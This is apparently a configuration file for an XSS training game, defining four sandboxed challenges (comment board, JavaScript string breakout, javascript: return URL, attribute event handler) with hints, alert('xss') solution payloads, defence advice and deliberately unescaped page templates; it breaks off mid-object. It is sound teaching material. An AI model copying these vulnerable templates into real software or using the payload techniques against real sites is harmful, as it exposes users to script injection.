// ─── Challenge sandbox types ────────────────────────────────────────────────
//
// "srcdoc"    — The vulnerable page is rendered entirely in the browser using
//               the iframe srcdoc attribute. No Docker container is needed.
//               Detection is instant via window.parent.postMessage.
//               Use this for stateless challenges (no server-side persistence).
//
// "container" — A real Docker container is started for this challenge.
//               Needed when the challenge requires server-side state (stored
//               posts, real HTTP endpoints, session cookies set by Set-Cookie).
//               Detection still uses postMessage (the container template
//               intercepts the triggering action and posts to the parent).

// ─── Template placeholder reference ─────────────────────────────────────────
//
// Placeholders used in pageTemplate strings (srcdoc challenges only):
//   {payload}          — raw user payload, injected unescaped (the vulnerability)
//   {payload_escaped}  — HTML-escaped payload, safe for attribute values / text
//   {show_if_payload}  — "display:none" when payload is empty, "" otherwise

export const CHALLENGES = {
  xss: [
    {
      id: "xss-1-reflected",
      title: "Challenge 1: The Comment Board",
      difficulty: 1,
      points: 100,
      targetName: "ByteBoard",
      editorLanguage: "html",
      sandboxType: "srcdoc", // stateless — no Docker container needed
      editorLabel: "Payload",
      editorAction: "Inject into Page",
      editorHint: "Type an HTML payload here. It gets pasted directly into the page's comment field without any sanitization — just as a real attacker would exploit it.",
      editorPlaceholder: "<tag>...</tag>",
      summary: "Inject a script into an unsanitized comment field.",
      description:
        "ByteBoard is a community comment board. Users can post comments and see them rendered on the page.\n\nThe developer built it in a hurry and didn't sanitize user input before displaying it. Can you inject a script that calls alert()?",
      goal: "Make the page execute alert('xss')",
      hints: [
        "HTML allows you to embed scripts using a specific tag. What tag is used to run JavaScript?",
        "Try wrapping your payload in <script> tags. What happens?",
        "The input is reflected directly into the HTML. Try: <script>alert('xss')</script>",
      ],
      solution: {
        payload: "<script>alert('xss')</script>",
        explanation: [
          "The website copied your input directly onto the page without checking it first.",
          "Your <script> tag looked like real code to the browser, so it ran immediately when the page loaded.",
          "This is called reflected XSS — the attack travels in the URL, so anyone who clicks the same link gets hit too.",
        ],
      },
      defense: {
        summary: "The site had its own protection but turned it off. The fix is to turn it back on and add a backup rule.",
        measures: [
          {
            title: "Always clean user input before displaying it",
            body: "Before showing anything a user typed, convert dangerous characters like < and > into safe versions that the browser won't treat as code. Most frameworks do this automatically — never disable it.",
          },
          {
            title: "Add a Content Security Policy (CSP)",
            body: "A CSP is a rule you set on the server that tells the browser: only run scripts from approved places. Even if an attacker sneaks a script tag into the page, the browser will refuse to run it.",
          },
        ],
      },
      pageTemplate: `<!DOCTYPE html>
<html>
<head>
  <title>CyberQuest :: ByteBoard</title>
  <style>
    body { font-family: monospace; background: #0f172a; color: #e2e8f0; padding: 24px; }
    h2 { color: #38bdf8; }
    .comment-box { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
    input[type=text] { width: 100%; padding: 8px; background: #1e293b; border: 1px solid #334155; color: #e2e8f0; border-radius: 4px; box-sizing: border-box; }
    button { margin-top: 8px; padding: 8px 16px; background: #0ea5e9; color: #0f172a; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
    .author { color: #94a3b8; font-size: 12px; margin-bottom: 4px; }
  </style>
  <script>
    // Intercept alert() and notify the parent React frame via postMessage.
    // This replaces the old fetch('/xss-triggered') + polling approach.
    window.alert = function(msg) {
      window.parent.postMessage({ type: 'xss-triggered' }, '*');
      var banner = document.createElement('div');
      banner.style = 'position:fixed;top:0;left:0;width:100%;background:#22c55e;color:#000;text-align:center;padding:12px;font-weight:bold;font-size:16px;font-family:monospace;z-index:9999';
      banner.innerText = '🎉 XSS Triggered! alert("' + msg + '") fired successfully.';
      if (document.body) { document.body.prepend(banner); }
      else { document.addEventListener('DOMContentLoaded', function() { document.body.prepend(banner); }); }
    };
  </script>
</head>
<body>
  <h2>ByteBoard — Community Comments</h2>
  <p style="color:#94a3b8">Share your thoughts with the community!</p>
  <form onsubmit="return false;" style="margin-bottom:24px">
    <input type="text" placeholder="Leave a comment..." value="{payload_escaped}">
    <button type="button">Post</button>
  </form>
  <div>
    <div class="comment-box" style="{show_if_payload}">
      <div class="author">anonymous · just now</div>
      <div>{payload}</div>
    </div>
    <div class="comment-box">
      <div class="author">alice · 2 hours ago</div>
      <div>Great platform, really enjoying it!</div>
    </div>
    <div class="comment-box">
      <div class="author">bob · 5 hours ago</div>
      <div>Anyone else having trouble with challenge 3?</div>
    </div>
  </div>
</body>
</html>`,
      animation: [
        {
          type: "block",
          label: "server template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "<div>", cls: "text-gray-500" },
            { text: "{{ comment | safe }}", cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: "</div>", cls: "text-gray-500" },
            { text: "↑ safe filter — HTML escaping disabled", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: "after injection" },
        {
          type: "block",
          label: "rendered in browser",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "<div>", cls: "text-gray-500" },
            { text: "<script>", cls: "text-red-400 font-bold", delay: 1.1 },
            { text: "alert('xss')", cls: "text-orange-300 font-bold", delay: 1.3 },
            { text: "</script>", cls: "text-red-400 font-bold", delay: 1.5 },
            { text: "</div>", cls: "text-gray-500" },
            { text: "↑ script tag inserted verbatim → browser executes it", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 1.7 },
          ],
        },
        {
          type: "legend",
          delay: 2.0,
          items: [
            { code: "{{ comment | safe }}", codeCls: "text-yellow-400", desc: "renders raw user input — no sanitization, no escaping", delay: 2.0 },
            { code: "<script>…</script>", codeCls: "text-red-400", desc: "injected tag runs immediately when the page loads", delay: 2.2 },
          ],
        },
      ],
    },
    {
      id: "xss-2-search",
      title: "Challenge 2: The Analytics Script",
      difficulty: 2,
      points: 150,
      targetName: "DevDocs",
      editorLanguage: "html",
      sandboxType: "srcdoc", // stateless — no Docker container needed
      editorLabel: "Search Query",
      editorAction: "Inject into Page",
      editorHint: "Your input is embedded inside a JavaScript string in the page source. Try a payload that breaks out of the string context and executes its own code.",
      editorPlaceholder: `"; your code here//`,
      summary: "Break out of a JavaScript string context to execute code.",
      description:
        "DevDocs is a documentation search site. The developer properly escaped the search results display — but they left a hidden analytics script that embeds your search query directly into JavaScript source code.\n\nTo find it:\n1. Type anything into the search box and press Search.\n2. Right-click inside the DevDocs panel and choose **View Frame Source** (Chrome) or **This Frame → View Frame Source** (Firefox).\n3. Scroll to the very bottom — you'll see a <script> block with a variable that contains your search query.\n4. Now figure out how to break out of that variable and run your own code.\n\nHTML tags won't work here. The vulnerability is at the JavaScript level.",
      goal: "Break out of the JavaScript string and call alert('xss')",
      hints: [
        "Right-click inside the DevDocs panel on the right and choose 'View Frame Source'. Look for a <script> block near the bottom — what does it do with your search query?",
        "Your input is placed inside a JavaScript string: var _lastQuery = \"YOUR_INPUT\". Injecting <script> tags won't help here.",
        "To escape a JavaScript string, you need to close the quote first. What character ends a double-quoted string?",
        "Try: \"; alert('xss')//  — the double-quote closes the string, the semicolon ends the statement, the double-slash comments out the trailing quote.",
      ],
      solution: {
        payload: `"; alert('xss')//`,
        explanation: [
          "The page hid your search inside a JavaScript box: var _lastQuery = \"your search here\".",
          "By typing \" at the start, you closed that box early — you were now outside it and writing live JavaScript.",
          "The // at the end commented out the leftover quote so the browser saw no errors.",
          "This works even when the site blocks HTML tags, because the attack is hiding inside JavaScript code, not HTML.",
        ],
      },
      defense: {
        summary: "The developer pasted user input straight into JavaScript code. Cleaning up HTML characters doesn't help here — the attack happened at the code level, not the HTML level.",
        measures: [
          {
            title: "Never paste user input into JavaScript code",
            body: "Pass data using HTML data attributes (like data-value=\"...\") and read it with JavaScript separately. This keeps code and data in different lanes so there's no box to break out of.",
          },
          {
            title: "Use JSON.stringify() if you must inline a value",
            body: "JSON.stringify() wraps the value in safe quotes and handles any special characters automatically — including the double quote that caused this attack.",
          },
          {
            title: "Add a Content Security Policy with a nonce",
            body: "A nonce is a one-time code the server puts on every approved script. The browser blocks any script without one — so injected code can't run even if it gets onto the page.",
          },
        ],
      },
      pageTemplate: `<!DOCTYPE html>
<html>
<head>
  <title>CyberQuest :: DevDocs</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: monospace; background: #0f172a; color: #e2e8f0; padding: 24px; margin: 0; }
    h2 { color: #38bdf8; margin-bottom: 4px; }
    .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; }
    .search-bar { display: flex; gap: 8px; margin-bottom: 24px; }
    input[type=text] { flex: 1; padding: 10px 12px; background: #1e293b; border: 1px solid #334155; color: #e2e8f0; border-radius: 6px; font-family: monospace; font-size: 14px; }
    input[type=text]:focus { outline: none; border-color: #38bdf8; }
    button { padding: 10px 18px; background: #0ea5e9; color: #0f172a; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-family: monospace; }
    .results-label { font-size: 13px; color: #94a3b8; margin-bottom: 12px; }
    .results-label .query { color: #e2e8f0; }
    .doc-card { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 14px 16px; margin-bottom: 10px; }
    .doc-card h3 { color: #7dd3fc; margin: 0 0 4px; font-size: 14px; }
    .doc-card p { color: #94a3b8; margin: 0; font-size: 13px; line-height: 1.5; }
    .no-results { color: #64748b; font-size: 14px; padding: 24px 0; }
    .analytics-bar { font-size: 11px; color: #334155; border-top: 1px solid #1e293b; padding-top: 8px; margin-top: 24px; }
  </style>
  <script>
    // Intercept alert() and notify the parent React frame via postMessage.
    window.alert = function(msg) {
      window.parent.postMessage({ type: 'xss-triggered' }, '*');
      var banner = document.createElement('div');
      banner.style = 'position:fixed;top:0;left:0;width:100%;background:#22c55e;color:#000;text-align:center;padding:12px;font-weight:bold;font-size:16px;font-family:monospace;z-index:9999';
      banner.innerText = '🎉 XSS Triggered! alert("' + msg + '") fired successfully.';
      if (document.body) { document.body.prepend(banner); }
      else { document.addEventListener('DOMContentLoaded', function() { document.body.prepend(banner); }); }
    };
  </script>
</head>
<body>
  <h2>DevDocs — API Reference</h2>
  <p class="subtitle">Search the developer documentation library.</p>
  <div class="search-bar">
    <input type="text" id="search-input" placeholder="Search docs..." value="{payload_escaped}">
    <button type="button" onclick="doSearch()">Search</button>
  </div>
  <div style="{show_if_payload}">
    <p class="results-label">Showing results for: <span class="query">{payload_escaped}</span></p>
  </div>
  <div id="results-container"></div>
  <div class="analytics-bar">page analytics active · last query tracked in source</div>
  <script>
    var DOCS = [
      { title: 'fetch(url, options)', body: 'Starts the process of fetching a resource from the network, returning a promise which is fulfilled once the response is available.' },
      { title: 'document.querySelector(selector)', body: 'Returns the first Element within the document that matches the specified selector, or null if no element matches.' },
      { title: 'addEventListener(type, listener)', body: 'Sets up a function that will be called whenever the specified event is delivered to the target.' },
      { title: 'localStorage.setItem(key, value)', body: 'Stores a key/value pair in localStorage. Data persists across browser sessions.' },
      { title: 'JSON.stringify(value)', body: 'Converts a JavaScript value to a JSON string.' },
      { title: 'Promise.all(iterable)', body: 'Takes an iterable of promises and returns a single Promise that resolves to an array of results.' }
    ];
    function renderDocs(docs) {
      var c = document.getElementById('results-container');
      if (!docs.length) { c.innerHTML = '<p class="no-results">No results found. Try a different search term.</p>'; return; }
      c.innerHTML = docs.map(function(d) { return '<div class="doc-card"><h3>' + d.title + '</h3><p>' + d.body + '</p></div>'; }).join('');
    }
    function doSearch() {
      var q = document.getElementById('search-input').value.toLowerCase();
      renderDocs(q ? DOCS.filter(function(d) { return d.title.toLowerCase().includes(q) || d.body.toLowerCase().includes(q); }) : DOCS);
    }
    // Initial render reads from the DOM so HTML-decoded input value is used correctly
    document.addEventListener('DOMContentLoaded', doSearch);
  </script>
  <script>
    /* analytics.js — do not modify */
    var _lastQuery = "{payload}";
    if (_lastQuery) { console.log('[analytics] user searched: ' + _lastQuery); }
  </script>
</body>
</html>`,
      animation: [
        {
          type: "block",
          label: "server template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "var ", cls: "text-blue-300" },
            { text: "_lastQuery", cls: "text-cyan-300" },
            { text: " = ", cls: "text-gray-400" },
            { text: '"', cls: "text-green-400" },
            { text: "   your input here   ", cls: "text-gray-600 italic", delay: 0.3 },
            { text: '"', cls: "text-green-400" },
            { text: ";", cls: "text-gray-400" },
          ],
        },
        { type: "arrow", delay: 0.7, label: "after injection" },
        {
          type: "block",
          label: `after payload: "; alert('xss')//`,
          accent: "orange",
          delay: 0.9,
          segments: [
            { text: "var ", cls: "text-blue-300" },
            { text: "_lastQuery", cls: "text-cyan-300" },
            { text: " = ", cls: "text-gray-400" },
            { text: '"', cls: "text-green-400" },
            { text: '"', cls: "text-orange-400 font-bold", delay: 1.1 },
            { text: ";", cls: "text-gray-400", delay: 1.3 },
            { text: " ", cls: "text-gray-400", delay: 1.3 },
            { text: "alert", cls: "text-red-400 font-bold", delay: 1.5 },
            { text: "('xss')", cls: "text-yellow-300 font-bold", delay: 1.5 },
            { text: "//", cls: "text-gray-600", delay: 1.7 },
            { text: '";', cls: "text-gray-700 line-through", delay: 1.9 },
          ],
        },
        {
          type: "legend",
          delay: 2.1,
          items: [
            { code: '"', codeCls: "text-orange-400", desc: "closes the open string — you are now outside the string context", delay: 2.1 },
            { code: ";", codeCls: "text-gray-400", desc: "ends the var statement", delay: 2.3 },
            { code: "alert('xss')", codeCls: "text-red-400", desc: "free-standing statement — browser executes it", delay: 2.5 },
            { code: "//", codeCls: "text-gray-500", desc: 'comments out the trailing "; that would cause a syntax error', delay: 2.7 },
          ],
        },
      ],
    },
    {
      id: "xss-3-url",
      title: "Challenge 3: The Return Link",
      difficulty: 2,
      points: 150,
      targetName: "ReturnPortal",
      editorLanguage: "plaintext",
      sandboxType: "srcdoc", // stateless — no Docker container needed
      editorLabel: "Return URL",
      editorAction: "Set Return URL",
      editorHint: "Your input becomes the href of the 'Return to previous page' link. The page expects an http:// URL — try a URI scheme that tells the browser to run code instead of navigating.",
      editorPlaceholder: "scheme:...",
      summary: "Inject a javascript: URI into a link's href to execute code.",
      description:
        "ReturnPortal is a login service used by internal company tools. When your session expires on a company app, you get redirected through ReturnPortal to log back in — and it sends you right back using a return URL.\n\nStart on CorpDash on the right. Your session has expired — click Login to go through ReturnPortal. Notice the 'Returning to:' field and how it reflects your payload.\n\nTo find the vulnerability:\n· After logging in, right-click the panel → View Frame Source. Find the comment near the return link.\n· Think about what kinds of values a browser accepts as a valid href.",
      goal: "Make the page execute alert('xss') by injecting a javascript: URI as the return URL",
      hints: [
        "Click Login on CorpDash. On the ReturnPortal page, notice the 'Returning to:' field — it shows your current payload. Right-click the panel → View Frame Source and find the comment near the return link.",
        "Your input lands directly in the href of an <a> tag. Injecting <script> tags won't help — there is no HTML body context here. Think about what a browser accepts as a valid href value.",
        "Browsers support URI schemes beyond http:// and https://. One scheme tells the browser to run JavaScript instead of navigating to a page. What is it?",
      ],
      solution: {
        payload: "javascript:alert('xss')",
        explanation: [
          "Your input landed directly in the href attribute of a link — the 'Returning to:' line showed you exactly what it was set to.",
          "javascript: is a valid URI scheme. When you click a link with href='javascript:...', the browser runs the code after the colon instead of navigating to a page.",
          "The developer's <script> tag filter was useless here — the attack never used a script tag. The payload lived entirely inside an href attribute.",
          "This pattern is common in real apps: login redirects, email unsubscribe links, 'open in app' prompts. Any URL embedded in a page without scheme validation is vulnerable.",
        ],
      },
      defense: {
        summary: "The href accepted any URI scheme without validation. Checking that the URL starts with http:// or https:// would have stopped this entirely.",
        measures: [
          {
            title: "Validate the URL scheme before using it",
            body: "Check that the URL starts with http:// or https:// before embedding it in an href. Reject anything else — javascript:, data:, and vbscript: are all dangerous schemes.",
            code: `// Vulnerable — runs any URI scheme including javascript:
return-link.addEventListener('click', function(e) {
  e.preventDefault();
  var href = this.getAttribute('href') || '';
  if (href.toLowerCase().indexOf('javascript:') === 0) {
    var code = href.slice(href.indexOf(':') + 1);
    try { (new Function(code))(); } catch(err) {}
  } else {
    showDashboard();
  }
});

// Secure — only allows http:// and https://
return-link.addEventListener('click', function(e) {
  e.preventDefault();
  var href = this.getAttribute('href') || '';
  if (/^https?:\\/\\//i.test(href)) {
    showDashboard();
  }
  // Any other scheme (javascript:, data:, etc.) is silently rejected
});`,
          },
          {
            title: "Use encodeURIComponent() for URL parameters",
            body: "When putting user input inside a URL, encode it first. encodeURIComponent() converts special characters to percent-encoding, preventing scheme injection.",
          },
          {
            title: "Add a Content Security Policy",
            body: "A CSP with script-src 'self' prevents javascript: URIs from executing when clicked, acting as a second line of defence even if the URL slips through.",
          },
        ],
      },
      pageTemplate: `<!DOCTYPE html>
<html>
<head>
  <title>CyberQuest :: ReturnPortal</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: monospace; background: #0f172a; color: #e2e8f0; margin: 0; }
    /* --- ReturnPortal (login success) --- */
    #page-login { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 24px; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 36px 32px; max-width: 400px; width: 100%; text-align: center; }
    .logo { font-size: 32px; margin-bottom: 6px; }
    .app-name { font-size: 18px; font-weight: bold; color: #38bdf8; margin-bottom: 20px; }
    .badge { display: inline-flex; align-items: center; gap: 6px; background: #052e16; border: 1px solid #16a34a; color: #4ade80; border-radius: 20px; padding: 6px 14px; font-size: 12px; font-weight: bold; margin-bottom: 20px; }
    .message { color: #94a3b8; font-size: 13px; line-height: 1.6; margin-bottom: 8px; }
    .return-url { font-size: 11px; color: #475569; margin-bottom: 24px; word-break: break-all; min-height: 16px; }
    .return-url span { color: #64748b; }
    .return-btn { color: #38bdf8; text-decoration: none; font-size: 14px; font-weight: bold; padding: 10px 24px; border: 1px solid #38bdf8; border-radius: 6px; display: inline-block; }
    .return-btn:hover { background: #0ea5e9; color: #0f172a; }
    /* --- CorpDash (destination page) --- */
    #page-dashboard { display: none; min-height: 100vh; }
    .dash-header { background: #1e293b; border-bottom: 1px solid #334155; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; }
    .dash-logo { color: #a78bfa; font-weight: bold; font-size: 15px; }
    .dash-user { color: #64748b; font-size: 12px; }
    .dash-body { padding: 24px; }
    .dash-title { font-size: 16px; font-weight: bold; color: #e2e8f0; margin: 0 0 4px; }
    .dash-sub { color: #64748b; font-size: 13px; margin: 0 0 24px; }
    .dash-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px; }
    .dash-card { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 16px; }
    .dash-card-label { color: #64748b; font-size: 11px; letter-spacing: 0.08em; margin: 0 0 4px; }
    .dash-card-value { color: #e2e8f0; font-size: 22px; font-weight: bold; margin: 0; }
    .dash-activity { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
    .dash-activity-title { color: #94a3b8; font-size: 12px; font-weight: bold; letter-spacing: 0.08em; margin: 0 0 12px; }
    .dash-item { display: flex; justify-content: space-between; font-size: 12px; color: #64748b; padding: 6px 0; border-bottom: 1px solid #1e293b; }
    .dash-item:last-child { border-bottom: none; }
    .dash-item span { color: #94a3b8; }
    .login-btn { background: none; border: 1px solid #334155; color: #94a3b8; font-family: monospace; font-size: 13px; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
    .login-btn:hover { border-color: #38bdf8; color: #38bdf8; }
  </style>
  <script>
    window.alert = function(msg) {
      window.parent.postMessage({ type: 'xss-triggered' }, '*');
      var banner = document.createElement('div');
      banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:#22c55e;color:#000;text-align:center;padding:12px;font-weight:bold;font-size:16px;font-family:monospace;z-index:9999';
      banner.textContent = 'XSS Triggered! javascript: URI executed successfully.';
      document.body.prepend(banner);
    };
    function showDashboard() {
      document.getElementById('page-login').style.display = 'none';
      document.getElementById('page-dashboard').style.display = 'block';
    }
    function showLogin() {
      document.getElementById('page-dashboard').style.display = 'none';
      document.getElementById('page-login').style.cssText = 'display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px';
    }
</script>
</head>
<body>
  <!-- ReturnPortal: login success page -->
  <div id="page-login">
    <div class="card">
      <div class="logo">🔐</div>
      <div class="app-name">ReturnPortal</div>
      <div class="badge">✓ Login successful</div>
      <p class="message">Welcome back. Click below to return to where you left off.</p>
      <p class="return-url">Returning to: <span>{payload_escaped}</span></p>
      <!-- returnUrl from query param embedded directly — no scheme validation — TODO before v2 -->
      <a class="return-btn" href="{payload}" id="return-link">← Return to previous page</a>
    </div>
  </div>
  <!-- CorpDash: destination page shown when a normal URL is followed -->
  <div id="page-dashboard">
    <div class="dash-header">
      <span class="dash-logo">⚡ CorpDash</span>
      <span class="dash-user">alice@corp.internal</span>
    </div>
    <div class="dash-body">
      <p class="dash-title">Dashboard</p>
      <p class="dash-sub">Internal company portal</p>
      <div class="dash-grid">
        <div class="dash-card">
          <p class="dash-card-label">OPEN TICKETS</p>
          <p class="dash-card-value">12</p>
        </div>
        <div class="dash-card">
          <p class="dash-card-label">TEAM ONLINE</p>
          <p class="dash-card-value">4</p>
        </div>
      </div>
      <div class="dash-activity">
        <p class="dash-activity-title">RECENT ACTIVITY</p>
        <div class="dash-item"><span>Ticket #204 updated</span> 2 min ago</div>
        <div class="dash-item"><span>Deploy to staging — passed</span> 18 min ago</div>
        <div class="dash-item"><span>alice left a comment on PR #88</span> 1 hr ago</div>
      </div>
      <div style="background:#052e16;border:1px solid #16a34a;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:12px;color:#4ade80">
        ✓ Successfully logged in. Click the Login button below to log in again.
      </div>
      <button class="login-btn" onclick="showLogin()">Login via ReturnPortal →</button>
    </div>
  </div>
  <script>
    document.getElementById('return-link').addEventListener('click', function(e) {
      e.preventDefault();
      var href = this.getAttribute('href') || '';
      if (href.toLowerCase().indexOf('javascript:') === 0) {
        var code = href.slice(href.indexOf(':') + 1);
        try { (new Function(code))(); } catch(err) {}
      } else {
        showDashboard();
      }
    });
  </script>
</body>
</html>`,
      animation: [
        {
          type: "block",
          label: "link template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "<a ", cls: "text-gray-500" },
            { text: "href=", cls: "text-gray-400" },
            { text: '"{returnUrl}"', cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: ">", cls: "text-gray-500" },
            { text: "↑ href set directly from user input — no scheme check", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: "payload: javascript:alert('xss')" },
        {
          type: "block",
          label: "rendered in browser",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "<a ", cls: "text-gray-500" },
            { text: "href=", cls: "text-gray-400" },
            { text: '"', cls: "text-gray-400" },
            { text: "javascript:", cls: "text-red-400 font-bold", delay: 1.1 },
            { text: "alert('xss')", cls: "text-orange-300 font-bold", delay: 1.3 },
            { text: '"', cls: "text-gray-400" },
            { text: ">", cls: "text-gray-500" },
            { text: "↑ user clicks link → browser executes the javascript: URI", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 1.5 },
          ],
        },
        {
          type: "legend",
          delay: 1.8,
          items: [
            { code: "javascript:", codeCls: "text-red-400", desc: "valid URI scheme — tells the browser to run code, not navigate", delay: 1.8 },
            { code: "alert('xss')", codeCls: "text-orange-300", desc: "executes in the page context when the link is clicked", delay: 2.0 },
          ],
        },
      ],
    },
    {
      id: "xss-4-attr",
      title: "Challenge 4: The Profile Page",
      difficulty: 2,
      points: 150,
      targetName: "ProfileHub",
      editorLanguage: "plaintext",
      sandboxType: "srcdoc", // stateless — no Docker container needed
      editorLabel: "Username",
      editorAction: "Save Profile",
      editorHint: "Your input is reflected into the value attribute of an HTML input element. Try a payload that closes the attribute with \" and injects an event handler. After saving, click the username field in the preview to trigger it.",
      editorPlaceholder: `" event="...`,
      summary: "Break out of an HTML attribute and inject an event handler.",
      description:
        "ProfileHub is an internal employee directory tool. Staff can update their display name, and the updated name is reflected back in the username field so you can see what was saved.\n\nThe developer added a filter that strips <script> tags — but the username goes directly into an HTML attribute without escaping quotes.\n\nTo find the vulnerability:\n· Enter any text and View Frame Source. Find the comment near the username input.\n· Think about where exactly your input lands. Does injecting <script> work inside an attribute value?\n· Once you've injected your payload, click the username field in the preview to trigger it.",
      goal: "Make the page execute alert('xss') by breaking out of the value attribute and injecting an event handler",
      hints: [
        "View Frame Source and find where your input appears in the HTML. Is it inside a tag or inside an attribute value? A <script> tag injected inside value=\"...\" is treated as text, not code.",
        "Your input lands inside value=\"...\". The \" character closes the attribute. Once outside it, you can add new attributes to the same element.",
        "Event handler attributes run JavaScript when a user event fires. onclick runs when an element is clicked. onmouseover runs when the mouse hovers. Both are just HTML attributes — you can add them anywhere a normal attribute goes.",
        "The payload is: \" onclick=\"alert('xss') — the \" closes the value attribute, and onclick fires when you click the field. Inject the payload then click the username input in the preview.",
      ],
      solution: {
        payload: "\" onclick=\"alert('xss')",
        explanation: [
          "Your input was placed inside value=\"...\" without escaping the quote character. Injecting \" closed the attribute early.",
          "After the closing quote, you were now writing raw HTML attributes on the <input> element. autofocus and onfocus are valid HTML attributes — the browser parsed them as such.",
          "onclick fires the moment the element is clicked — clicking the username field after injecting triggers the handler immediately.",
          "The developer's <script> filter was useless here. The attack never used a script tag — it used an event handler attribute, which is a completely different injection context.",
        ],
      },
      defense: {
        summary: "The username was reflected into an HTML attribute without escaping quotes. Encoding \" as &quot; would have made the injection harmless.",
        measures: [
          {
            title: "Escape HTML attribute characters",
            body: "Before inserting user input into an attribute value, encode special characters: \" → &quot;, ' → &#39;, & → &amp;. This prevents the quote from closing the attribute.",
          },
          {
            title: "Never use blocklists to filter HTML",
            body: "Stripping <script> tags is not a security measure — it only blocks one injection vector. Attackers use event handlers, javascript: URIs, and other sinks that never involve a script tag.",
          },
          {
            title: "Use a trusted HTML sanitizer library",
            body: "DOMPurify, bleach, or your framework's built-in escaping will handle all attribute contexts correctly. Hand-rolled filters always miss edge cases.",
          },
        ],
      },
      pageTemplate: `<!DOCTYPE html>
<html>
<head>
  <title>CyberQuest :: ProfileHub</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: monospace; background: #0f172a; color: #e2e8f0; margin: 0; }
    .header { background: #1e293b; border-bottom: 1px solid #334155; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; }
    .header-logo { color: #34d399; font-weight: bold; font-size: 15px; }
    .header-user { color: #64748b; font-size: 12px; }
    .content { padding: 24px; max-width: 480px; }
    h2 { color: #34d399; margin: 0 0 4px; font-size: 16px; }
    .sub { color: #64748b; font-size: 13px; margin: 0 0 24px; }
    .form-card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 20px; }
    label { display: block; font-size: 12px; color: #94a3b8; margin: 14px 0 4px; }
    label:first-of-type { margin-top: 0; }
    input, textarea { width: 100%; padding: 8px 10px; background: #0f172a; border: 1px solid #334155; color: #e2e8f0; border-radius: 6px; font-family: monospace; font-size: 13px; }
    input:focus, textarea:focus { outline: none; border-color: #34d399; }
    textarea { resize: vertical; min-height: 64px; }
    .save-btn { margin-top: 16px; padding: 8px 18px; background: #059669; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-family: monospace; }
    .save-btn:hover { background: #047857; }
    .saved-note { font-size: 12px; color: #4ade80; margin-top: 10px; {show_if_payload} }
  </style>
  <script>
    window.alert = function(msg) {
      window.parent.postMessage({ type: 'xss-triggered' }, '*');
      var banner = document.createElement('div');
      banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:#22c55e;color:#000;text-align:center;padding:12px;font-weight:bold;font-size:16px;font-family:monospace;z-index:9999';
      banner.textContent = 'XSS Triggered! Attribute injection executed successfully.';
      document.body.prepend(banner);
    };
  </script>
</head>
<body>
  <div class="header">
    <span class="header-logo">👤 ProfileHub</span>
    <span class="header-user">employee #4821</span>
  </div>
  <div class="content">
    <h2>Edit Profile</h2>
    <p class="sub">Update your display name. Changes are saved immediately.</p>
    <div class="form-card">
      <label>Username</label>
      <!-- username reflected directly into value="" attribute — <script> tags stripped, but quotes not escaped -->
      <input type="text" name="username" value="{payload}">
      <label>Email</label>
      <input type="text" name="email" value="alice@corp.internal" readonly>
      <label>Department</label>
      <input type="text" name="dept" value="Engineering" readonly>
      <label>Bio</label>
      <textarea name="bio" readonly>Senior engineer. Working on platform security.</textarea>
      <button class="save-btn">Save Changes</button>
      <p class="saved-note">✓ Profile updated.</p>
    </div>
  </div>
</body>
</html>`,
      animation: [
        {
          type: "block",
          label: "input template",
          accent: "gray",
          delay: 0,
          segments: [
            { text: "<input ", cls: "text-gray-500" },
            { text: "value=", cls: "text-gray-400" },
            { text: '"', cls: "text-green-400" },
            { text: "{username}", cls: "text-yellow-400 bg-yellow-400/10 rounded px-1 mx-0.5" },
            { text: '"', cls: "text-green-400" },
            { text: ">", cls: "text-gray-500" },
            { text: "↑ username inserted into attribute — quotes not escaped", cls: "block text-xs text-yellow-600 mt-1 pl-1", delay: 0.4 },
          ],
        },
        { type: "arrow", delay: 0.7, label: `payload: " onclick="alert('xss')` },
        {
          type: "block",
          label: "rendered in browser",
          accent: "red",
          delay: 0.9,
          segments: [
            { text: "<input ", cls: "text-gray-500" },
            { text: "value=", cls: "text-gray-400" },
            { text: '"', cls: "text-gray-400" },
            { text: '"', cls: "text-orange-400 font-bold", delay: 1.1 },
            { text: " onclick=", cls: "text-red-400 font-bold", delay: 1.3 },
            { text: '"', cls: "text-gray-400", delay: 1.3 },
            { text: "alert('xss')", cls: "text-red-400 font-bold", delay: 1.5 },
            { text: '"', cls: "text-gray-400", delay: 1.5 },
            { text: ">", cls: "text-gray-500", delay: 1.5 },
            { text: "↑ quote closed the attribute — event handler injected as a new attribute", cls: "block text-xs text-red-500 mt-1 pl-1", delay: 1.7 },
          ],
        },
        {
